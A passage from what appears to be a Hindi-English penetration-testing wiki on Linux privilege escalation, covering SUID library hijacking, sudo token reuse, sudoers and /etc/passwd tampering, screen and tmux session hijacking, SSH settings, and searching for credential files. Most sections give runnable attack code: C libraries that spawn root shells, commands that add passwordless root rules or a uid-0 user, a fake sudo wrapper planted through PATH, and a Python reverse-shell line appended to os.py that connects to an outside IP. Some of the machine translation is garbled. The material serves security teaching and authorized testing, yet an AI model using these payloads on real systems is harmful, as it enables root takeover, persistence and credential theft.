```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी त्रुटि का सामना करना संभावित exploit का संकेत देता है।

इसे exploit करने के लिए, एक C file बनाएं, जैसे _"/path/to/.config/libcalc.c"_, जिसमें निम्नलिखित कोड होगा:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
ऊपर दिए गए C फ़ाइल को निम्न कमांड से एक shared object (.so) फ़ाइल में कंपाइल करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID बाइनरी को चलाने से exploit ट्रिगर होनी चाहिए, जिससे सिस्टम में संभावित समझौता संभव हो सके।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो उस फ़ोल्डर से एक library लोड कर रहा है जिसमें हम लिख सकते हैं, तो चलिए उस फ़ोल्डर में आवश्यक नाम के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको इस तरह की त्रुटि मिलती है
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix बाइनरीज़ की एक curated सूची है जिसे attacker स्थानीय सुरक्षा प्रतिबंधों को बायपास करने के लिए exploit कर सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) भी वही है पर उन मामलों के लिए जहाँ आप किसी command में **only inject arguments** कर सकते हैं।

यह प्रोजेक्ट Unix बाइनरीज़ के legit फ़ंक्शन्स को इकट्ठा करता है जिन्हें restricted shells से बाहर निकलने, privileges escalate या बनाए रखने, फाइलें transfer करने, bind और reverse shells spawn करने, और अन्य post-exploitation कार्यों के लिए abuse किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

If you can access `sudo -l` you can use the tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) to check if it finds how to exploit any sudo rule.

### Reusing Sudo Tokens

In cases where you have **sudo access** but not the password, you can escalate privileges by **waiting for a sudo command execution and then hijacking the session token**.

Requirements to escalate privileges:

- You already have a shell as user "_sampleuser_"
- "_sampleuser_" have **used `sudo`** to execute something in the **last 15mins** (by default that's the duration of the sudo token that allows us to use `sudo` without introducing any password)
- `cat /proc/sys/kernel/yama/ptrace_scope` is 0
- `gdb` is accessible (you can be able to upload it)

(You can temporarily enable `ptrace_scope` with `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` or permanently modifying `/etc/sysctl.d/10-ptrace.conf` and setting `kernel.yama.ptrace_scope = 0`)

If all these requirements are met, **you can escalate privileges using:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- The **first exploit** (`exploit.sh`) will create the binary `activate_sudo_token` in _/tmp_. You can use it to **activate the sudo token in your session** (you won't get automatically a root shell, do `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **दूसरा exploit** (`exploit_v2.sh`) एक sh shell को _/tmp_ में **root का स्वामित्व और setuid के साथ** बनाएगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- यह **तीसरा exploit** (`exploit_v3.sh`) एक **sudoers file** बनाएगा जो **sudo tokens को स्थायी बना देगा और सभी उपयोगकर्ताओं को sudo उपयोग करने की अनुमति देगा**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास उस फ़ोल्डर में या फ़ोल्डर के अंदर बने किसी भी फ़ाइल पर **write permissions** हैं, तो आप बाइनरी [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके **create a sudo token for a user and PID** कर सकते हैं।\
उदाहरण के लिए, अगर आप फ़ाइल _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 के साथ एक shell है, तो आप पासवर्ड जानने की आवश्यकता के बिना **obtain sudo privileges** कर सकते हैं, ऐसा करके:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह नियंत्रित करती हैं कि कौन `sudo` का उपयोग कर सकता है और कैसे। ये फ़ाइलें **डिफ़ॉल्ट रूप से केवल user root और group root द्वारा ही पढ़ी जा सकती हैं**.\
**यदि** आप इस फ़ाइल को **पढ़** सकते हैं तो आप कुछ दिलचस्प जानकारी **प्राप्त कर सकते हैं**, और अगर आप किसी फ़ाइल को **लिख** सकते हैं तो आप **escalate privileges** करने में सक्षम होंगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस अनुमति का दुरुपयोग कर सकते हैं।
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` बाइनरी के कुछ विकल्प हैं, जैसे OpenBSD के लिए `doas` — इसके कॉन्फ़िगरेशन को `/etc/doas.conf` पर जांचना न भूलें।
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक user आम तौर पर किसी मशीन से कनेक्ट होता है और प्रिविलेज बढ़ाने के लिए `sudo` का उपयोग करता है और आपने उस user context में एक shell हासिल कर लिया है, तो आप एक नया sudo executable बना सकते हैं जो पहले आपका कोड root के रूप में चलाएगा और फिर user का command चलाएगा। फिर, user context का **$PATH** संशोधित करें (उदाहरण के लिए नया path .bash_profile में जोड़कर) ताकि जब user sudo चलाए तो आपका sudo executable execute हो।

नोट करें कि अगर user कोई अलग shell (bash नहीं) इस्तेमाल करता है तो आपको नया path जोड़ने के लिए अन्य फाइलें बदलनी पड़ सकती हैं। उदाहरण के लिए[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को संशोधित करता है। आप एक और उदाहरण [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में देख सकते हैं।

या कुछ इस तरह चलाना:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## साझा लाइब्रेरी

### ld.so

फ़ाइल `/etc/ld.so.conf` बताती है **where the loaded configurations files are from**. आमतौर पर, इस फ़ाइल में निम्न पथ होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` से कॉन्फ़िगरेशन फ़ाइलें पढ़ी जाएँगी। ये कॉन्फ़िगरेशन फ़ाइलें उन अन्य फ़ोल्डरों की ओर इशारा करती हैं जहाँ लाइब्रेरीज़ खोजी जाएँगी। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की सामग्री `/usr/local/lib` है। **This means that the system will search for libraries inside `/usr/local/lib`**।

अगर किसी कारणवश **a user has write permissions** बताए गए किसी भी पाथ पर: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी फ़ाइल या `/etc/ld.so.conf.d/*.conf` में कॉन्फ़िग फ़ाइल द्वारा इंगित किसी भी फ़ोल्डर पर, तो वह **escalate privileges** कर सकता है.\
निम्नलिखित पृष्ठ में देखें कि **how to exploit this misconfiguration**:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करने पर यह उस स्थान पर प्रोग्राम द्वारा उपयोग किया जाएगा जैसा कि `RPATH` वेरिएबल में निर्दिष्ट है।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
फिर `/var/tmp` में एक दुर्भावनापूर्ण लाइब्रेरी बनाएं, इस कमांड के साथ: `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities किसी process को उपलब्ध root privileges का **उपसमुच्चय किसी process को उपलब्ध root privileges का** प्रदान करते हैं। यह प्रभावी रूप से root **privileges को छोटे और विशिष्ट इकाइयों में** विभाजित करता है। इन इकाइयों में से प्रत्येक को स्वतंत्र रूप से processes को प्रदान किया जा सकता है। इस तरह privileges का पूरा सेट कम हो जाता है, जिससे exploitation के जोखिम घटते हैं।\
निम्न पृष्ठ पढ़ें ताकि आप **capabilities और उन्हें कैसे abuse किया जा सकता है** के बारे में और जान सकें:

{{#ref}}
linux-capabilities.md
{{#endref}}

## निर्देशिका अनुमतियाँ

किसी निर्देशिका में, **"execute" के लिए बिट** संकेत देता है कि प्रभावित उपयोगकर्ता उस फ़ोल्डर में **"cd"** कर सकता है।\
**"read"** बिट का मतलब है कि उपयोगकर्ता **files** को **list** कर सकता है, और **"write"** बिट का मतलब है कि उपयोगकर्ता नई **files** को **create** और मौजूद **files** को **delete** कर सकता है।

## ACLs

Access Control Lists (ACLs) डिस्क्रेशनेरी permissions की द्वितीयक परत का प्रतिनिधित्व करते हैं, जो पारंपरिक **overriding the traditional ugo/rwx permissions** करने में सक्षम हैं। ये permissions फाइल या निर्देशिका के access पर नियंत्रण बढ़ाते हैं क्योंकि ये मालिक या समूह का हिस्सा न होने वाले विशिष्ट users को अधिकार allow या deny करने की अनुमति देते हैं। यह स्तर **सूक्ष्मता अधिक सटीक access प्रबंधन सुनिश्चित करता है**। Further details can be found [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**दे** user "kali" को किसी फ़ाइल पर read और write permissions दें:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**प्राप्त करें** सिस्टम से विशिष्ट ACLs वाली फ़ाइलें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Hidden ACL backdoor on sudoers drop-ins

एक सामान्य misconfiguration यह है कि `/etc/sudoers.d/` में mode `440` वाली root-owned फ़ाइल ACL के माध्यम से फिर भी low-priv user को write access दे देती है।
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
यदि आप `user:alice:rw-` जैसा कुछ देखते हैं, तो user प्रतिबंधित mode bits के बावजूद एक sudo rule जोड़ सकता है:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
यह एक उच्च-प्रभाव वाला ACL persistence/privesc path है क्योंकि इसे `ls -l`-only reviews में आसानी से छूटाया जा सकता है।

## खुले shell sessions

**old versions** में आप किसी अन्य user के किसी **shell** session को **hijack** कर सकते हैं (**root**).\
**newest versions** में आप केवल अपने ही **your own user** के screen sessions से ही **connect** कर पाएँगे। हालाँकि, आप session के अंदर **interesting information inside the session** पा सकते हैं।

### screen sessions hijacking

**screen sessions की सूची**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**एक session से जुड़ें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं एक non-privileged user के रूप में root द्वारा बनाई गई tmux (v2.1) session को hijack करने में सक्षम नहीं था।

**tmux sessions को सूचीबद्ध करें**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**सत्र से जोड़ें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
यह बग उन OS में नया ssh key बनाते समय होता है, क्योंकि **only 32,768 variations were possible**. इसका मतलब है कि सभी संभावनाएँ कैल्कुलेट की जा सकती हैं और **ssh public key होने पर आप संबंधित private key खोज सकते हैं**. आप कैल्कुलेट की गई संभावनाएँ यहाँ पा सकते हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### Login control files

ये फाइलें यह प्रभावित करती हैं कि कौन कैसे लॉग इन कर सकता है:

- **`/etc/nologin`**: यदि मौजूद है, तो non-root logins को ब्लॉक करता है और अपना संदेश प्रिंट करता है।
- **`/etc/securetty`**: यह सीमित करता है कि root कहाँ लॉग इन कर सकता है (TTY allowlist)।
- **`/etc/motd`**: पोस्ट-लॉगिन बैनर (यह environment या maintenance विवरण को leak कर सकता है)।

### PermitRootLogin

निर्धारित करता है कि root ssh का उपयोग करके लॉग इन कर सकता है या नहीं, डिफ़ॉल्ट `no` है। संभावित मान:

- `yes`: root password और private key का उपयोग करके login कर सकता है
- `without-password` or `prohibit-password`: root केवल private key से ही login कर सकता है
- `forced-commands-only`: Root केवल private key का उपयोग करके और यदि commands विकल्प निर्दिष्ट हों तभी login कर सकता है
- `no` : नहीं

### AuthorizedKeysFile

निर्दिष्ट करता है वे फाइलें जिनमें वे public keys होते हैं जिनका उपयोग user authentication के लिए किया जा सकता है। इसमें `%h` जैसे tokens हो सकते हैं, जिन्हें home directory से बदला जाएगा। **आप absolute paths संकेत कर सकते हैं** (जो `/` से शुरू होते हैं) या **user के home से relative paths**. उदाहरण के लिए:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
यह configuration संकेत करेगा कि यदि आप उपयोगकर्ता "**testusername**" की **private** key से लॉगिन करने की कोशिश करते हैं, तो ssh आपके key के public key की तुलना `/home/testusername/.ssh/authorized_keys` और `/home/testusername/access` में मौजूद keys से करेगा।

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding आपको **use your local SSH keys instead of leaving keys** (without passphrases!) अपने सर्वर पर keys छोड़ने की बजाय आपके लोकल SSH keys का उपयोग करने की अनुमति देता है। इसलिए, आप ssh के माध्यम से **jump** **to a host** कर सकेंगे और वहां से **jump to another** host कर सकेंगे, **using** उस **key** को जो आपके **initial host** पर स्थित है।

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है तो हर बार जब उपयोगकर्ता किसी अलग मशीन पर जाता है, वह host keys तक पहुँच सकेगा (जो कि एक सुरक्षा समस्या है)।

फ़ाइल `/etc/ssh_config` इस कॉन्फ़िगरेशन को **override** कर सकती है और इस **options** को allow या deny कर सकती है। फ़ाइल `/etc/sshd_config` ssh-agent forwarding को कीवर्ड `AllowAgentForwarding` के साथ **allow** या **deny** कर सकती है (डिफ़ॉल्ट allow है)।

यदि आप पाते हैं कि Forward Agent किसी environment में configured है तो निम्न पेज पढ़ें क्योंकि आप इसे abuse करके escalate privileges कर सकते हैं:

{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## रोचक फ़ाइलें

### प्रोफ़ाइल फ़ाइलें

फ़ाइल `/etc/profile` और `/etc/profile.d/` के अंतर्गत की फ़ाइलें **स्क्रिप्ट्स हैं जो तब निष्पादित होती हैं जब कोई उपयोगकर्ता नया shell चलाता है**। इसलिए, यदि आप उनमें से किसी को भी **लिख या संशोधित कर सकते हैं तो आप escalate privileges कर सकते हैं**।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिलता है, तो आपको इसे **संवेदनशील जानकारी** के लिए जांचना चाहिए।

### Passwd/Shadow Files

OS के आधार पर `/etc/passwd` और `/etc/shadow` फाइलों का नाम अलग हो सकता है या कोई बैकअप मौजूद हो सकता है। इसलिए यह अनुशंसा की जाती है कि आप **find all of them** और **check if you can read** करें ताकि यह पता चल सके कि फाइलों के अंदर **if there are hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ मामलों में आप **password hashes** को `/etc/passwd` (या समतुल्य) फ़ाइल के अंदर पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### लिखने योग्य /etc/passwd

सबसे पहले, निम्नलिखित कमांडों में से किसी एक से एक password जेनरेट करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
फिर user `hacker` जोड़ें और उत्पन्न पासवर्ड `r8V!t9Q#Lp3ZsW2m` जोड़ें।
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
उदाहरण: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` कमांड का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप बिना पासवर्ड के एक डमी उपयोगकर्ता जोड़ने के लिए निम्नलिखित पंक्तियों का उपयोग कर सकते हैं.\

चेतावनी: आप मशीन की वर्तमान सुरक्षा को कमजोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
नोट: BSD प्लेटफ़ॉर्म्स में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित है, साथ ही `/etc/shadow` का नाम बदलकर `/etc/spwd.db` रखा गया है।

आपको जांचना चाहिए कि क्या आप **कुछ संवेदनशील फ़ाइलों में लिख सकते हैं**। उदाहरण के लिए, क्या आप किसी **सेवा कॉन्फ़िगरेशन फ़ाइल** में लिख सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, अगर मशीन पर **tomcat** सर्वर चल रहा है और आप **/etc/systemd/ के अंदर Tomcat service configuration file को बदल सकते हैं,** तो आप इन लाइनों को बदल सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार tomcat शुरू होने पर निष्पादित होगा।

### फ़ोल्डरों की जांच करें

निम्न फ़ोल्डरों में बैकअप या दिलचस्प जानकारी हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (संभवतः आप आखिरी को पढ़ नहीं पाएँगे, पर कोशिश करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब स्थान/Owned फ़ाइलें
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### पिछले कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई फ़ाइलें
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries PATH में**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **वेब फ़ाइलें**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### ज्ञात फ़ाइलें जिनमें passwords हो सकते हैं

Read the code of [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), यह **कई संभावित फ़ाइलों की तलाश करता है जिनमें passwords हो सकते हैं**.\
**एक और दिलचस्प टूल** जिसे आप इसके लिए उपयोग कर सकते हैं वह है: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक ओपन-सोर्स एप्लिकेशन है जिसका उपयोग लोकल कंप्यूटर पर Windows, Linux & Mac के लिए संग्रहीत कई passwords प्राप्त करने के लिए किया जाता है।

### Logs

यदि आप logs पढ़ सकते हैं, तो आप उनमें **दिलचस्प/गोपनीय जानकारी** पा सकते हैं। जितना अजीब log होगा, उतना ही यह (शायद) अधिक रोचक होगा।\
इसके अलावा, कुछ "**खराब**" कॉन्फ़िगर किए गए (backdoored?) **audit logs** आपको audit logs के अंदर **passwords रिकॉर्ड** करने की अनुमति दे सकते हैं जैसा कि इस पोस्ट में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग पढ़ने के लिए [**adm**](interesting-groups-linux-pe/index.html#adm-group) समूह वास्तव में बहुत मददगार होगा।

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फाइलों की भी जाँच करनी चाहिए जिनके **नाम** में या उनकी **सामग्री** के अंदर शब्द "**password**" मौजूद हों, और साथ ही logs के अंदर IPs और emails या hashes regexps की भी जाँच करें।\
मैं यहाँ यह सब कैसे करना है सूचीबद्ध नहीं कर रहा, पर अगर आप इच्छुक हैं तो आप देख सकते हैं वे अंतिम चेक्स जो [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform करते हैं।

## Writable files

### Python library hijacking

यदि आप जानते हैं कि एक python script कहाँ से execute की जाएगी और आप उस फोल्डर में **लिख सकते हैं** या आप **modify python libraries** कर सकते हैं, तो आप OS library को संशोधित करके उसे backdoor कर सकते हैं (यदि आप उस जगह लिख सकते हैं जहाँ python script execute होगी, तो os.py library को copy और paste करें)।

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate का शोषण

`logrotate` में एक कमज़ोरी उन users को, जिनके पास किसी लॉग फ़ाइल या उसके parent निर्देशिकाओं पर **write permissions** हैं, संभावित रूप से escalated privileges प्राप्त करने की अनुमति देती है। इसका कारण यह है कि `logrotate`, अक्सर **root** के रूप में चल रहा होता है, को arbitrary फाइलें execute करने के लिए manipulate किया जा सकता है, खासकर ऐसी निर्देशिकाओं में जैसे _**/etc/bash_completion.d/**_. यह महत्वपूर्ण है कि आप permissions की जाँच सिर्फ _/var/log_ में ही न करें बल्कि किसी भी डायरेक्टरी में जहाँ log rotation लागू किया गया है।

> [!TIP]
> यह कमज़ोरी `logrotate` version `3.18.0` और उससे पुराने पर असर करती है

इस कमज़ोरी के बारे में अधिक विस्तृत जानकारी इस पृष्ठ पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस कमज़ोरी का उपयोग [**logrotten**](https://github.com/whotwagner/logrotten) के साथ कर सकते हैं।

यह कमज़ोरी [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs)** के बहुत समान है, इसलिए जब भी आप पाते हैं कि आप logs को बदल सकते हैं, यह जाँचें कि कौन उन logs का प्रबंधन कर रहा है और देखें कि क्या आप logs को symlinks से बदलकर privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**कमज़ोरी संदर्भ:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि किसी भी कारण से कोई user `_ /etc/sysconfig/network-scripts_` में `ifcf-<whatever>` स्क्रिप्ट लिखने में सक्षम हो या किसी मौजूदा स्क्रिप्ट को **adjust** कर सके, तो आपकी **system is pwned**।

Network scripts, उदाहरण के लिए _ifcg-eth0_, network connections के लिए उपयोग होते हैं। ये बिल्कुल .INI फ़ाइलों जैसे दिखते हैं। हालांकि, इन्हें Linux पर Network Manager (dispatcher.d) द्वारा ~sourced~ किया जाता है।

